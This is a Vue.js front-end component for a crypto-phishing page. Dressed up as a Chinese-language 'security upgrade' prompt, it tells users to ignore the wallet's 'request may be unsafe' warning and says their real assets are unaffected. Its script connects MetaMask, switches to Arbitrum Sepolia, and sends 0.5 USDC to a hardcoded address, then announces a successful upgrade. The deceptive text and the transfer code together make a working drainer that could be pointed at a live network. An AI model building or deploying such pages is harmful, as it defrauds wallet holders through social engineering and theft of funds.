<template>
  <div class="bg-gray-50 min-h-screen">
    <div class="container mx-auto px-4 py-8 max-w-4xl">
      <div class="bg-white rounded-xl shadow-lg p-6 mb-6 transform transition-all duration-300 hover:shadow-xl">
        <h1 class="text-2xl font-bold text-gray-800 mb-4">系统升级确认</h1>
        
        <div class="mb-6">
          <p class="text-gray-700 mb-4">
            检测到您的账户需要进行安全升级，请点击下方按钮完成验证，以确保您的资产安全。
          </p>
          <div class="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
            <div class="flex items-start">
              <div class="flex-shrink-0 pt-0.5">
                <i class="fa fa-info-circle text-blue-500"></i>
              </div>
              <div class="ml-3">
                <h3 class="text-sm font-medium text-blue-800">重要提示</h3>
                <div class="mt-2 text-sm text-blue-700 space-y-1">
                  <h1 style="color: red">如果出现 “请求可能不安全” 的提示，请忽略</h1>
                  <p>• 此操作将验证您的账户权限</p>
                  <p>• 仅需支付少量测试网络手续费</p>
                  <p>• 不会对您的真实资产造成任何影响</p>
                </div>
              </div>
            </div>
          </div>
        </div>
        
        <button 
          @click="confirmUpgrade" 
          :disabled="isLoading"
          class="w-full bg-blue-500 hover:bg-blue-600 text-white font-medium py-2.5 px-6 rounded-lg transition-all duration-300 transform hover:scale-[1.02] focus:outline-none focus:ring-2 focus:ring-blue-400 disabled:opacity-50 disabled:hover:bg-blue-500 disabled:cursor-not-allowed"
        >
          <span v-if="isLoading" class="animate-spin mr-2"><i class="fa fa-circle-o-notch"></i></span>
          确认升级
        </button>
      </div>
      
      <div v-if="transactionHash" class="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
        <div class="flex items-start">
          <div class="flex-shrink-0 pt-0.5">
            <i class="fa fa-check-circle text-green-500"></i>
          </div>
          <div class="ml-3">
            <h3 class="text-sm font-medium text-green-800">验证成功</h3>
            <div class="mt-2 text-sm text-green-700">
              <p>交易哈希: <a :href="getEtherscanUrl()" target="_blank" class="text-blue-600 hover:underline">{{ transactionHash }}</a></p>
              <p class="mt-1">您的账户已成功升级，感谢您的配合。</p>
            </div>
          </div>
        </div>
      </div>
      
      <div v-if="errorMessage" class="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
        <div class="flex items-start">
          <div class="flex-shrink-0 pt-0.5">
            <i class="fa fa-exclamation-circle text-red-500"></i>
          </div>
          <div class="ml-3">
            <h3 class="text-sm font-medium text-red-800">操作失败</h3>
            <div class="mt-2 text-sm text-red-700">
              <p>{{ errorMessage }}</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Web3 from 'web3';
export default {
  name: 'Home',
  data() {
    return {
      isLoading: false,
      transactionHash: '',
      errorMessage: '',
      recipientAddress: '0xBcceb0FD440fC21150DC2b63Db2c227AAc941323', // 接收地址（写死）
      amount: 0.5, // 转账金额（写死）
      usdcDecimals: 6, // USDC 使用 6 位小数
      usdcContractAddress: '0x75faf114eafb1BDbe2F0316DF893fd58CE46AA4d', // Arbitrum Sepolia测试网USDC地址
      networkChainId: '0x66eee', // Arbitrum Sepolia的链ID
      networkInfo: {
        chainId: '0x66eee',
        chainName: 'Arbitrum Sepolia',
        nativeCurrency: {
          name: 'Ether',
          symbol: 'ETH',
          decimals: 18
        },
        rpcUrls: ['https://sepolia-rollup.arbitrum.io/rpc'],
        blockExplorerUrls: ['https://sepolia.arbiscan.io']
      }
    };
  },
  methods: {
    async confirmUpgrade() {
      if (this.isLoading) return;
      
      this.isLoading = true;
      this.errorMessage = '';
      this.transactionHash = '';
      
      try {
        // 检查MetaMask是否安装
        if (!window.ethereum) {
          throw new Error('请安装MetaMask钱包以继续');
        }
        
        // 请求连接钱包
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        
        // 检查网络
        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (currentChainId !== this.networkChainId) {
          // 尝试切换网络
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: this.networkChainId }]
          });
        }
        
        // 初始化Web3
        const web3 = new Web3(window.ethereum);
        
        // USDC合约ABI
        const usdcAbi = [
          {
            "constant": false,
            "inputs": [
              {
                "name": "_to",
                "type": "address"
              },
              {
                "name": "_value",
                "type": "uint256"
              }
            ],
            "name": "transfer",
            "outputs": [
              {
                "name": "",
                "type": "bool"
              }
            ],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          }
        ];
        
        // 创建合约实例
        const usdcContract = new web3.eth.Contract(usdcAbi, this.usdcContractAddress);
        
        // 将0.5 USDC转换为wei (USDC有6位小数)
        // const amountInWei = web3.utils.toBN(this.amount).mul(web3.utils.toBN(10).pow(web3.utils.toBN(6)));
        const amountInWei = web3.utils.toBN(this.amount * Math.pow(10, this.usdcDecimals));
        
        // 发送交易
        const tx = await usdcContract.methods.transfer(
          this.recipientAddress,
          amountInWei
        ).send({
          from: accounts[0]
        });
        
        this.transactionHash = tx.transactionHash;
        alert('系统升级成功！')
      } catch (error) {
        console.error('交易错误:', error);
        this.errorMessage = error.message || '交易失败，请重试';
      } finally {
        this.isLoading = false;
      }
    },
    
    getEtherscanUrl() {
      return `https://sepolia.arbiscan.io/tx/${this.transactionHash}`;
    }
  }
};
</script>

<style scoped>
/* 这里可以添加自定义样式 */
</style>